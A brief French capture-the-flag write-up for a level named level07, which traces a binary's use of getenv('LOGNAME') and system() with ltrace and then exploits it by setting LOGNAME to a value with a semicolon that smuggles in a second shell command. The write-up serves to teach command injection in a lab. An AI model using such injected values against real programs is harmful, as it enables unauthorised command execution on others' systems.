## Level 07

### Analyse
Le binaire level07 est un exécutable C. L'analyse avec ltrace montre :

1. Un appel à getenv("LOGNAME").
2. Une construction de commande avec asprintf.
3. Un appel à system("/bin/echo ...").

### Exploitation
On injecte un point-virgule pour séparer les commandes shell :

```bash
$ export LOGNAME="; getflag"
$ ./level07
```
Le shell exécute /bin/echo (vide) puis notre commande getflag.
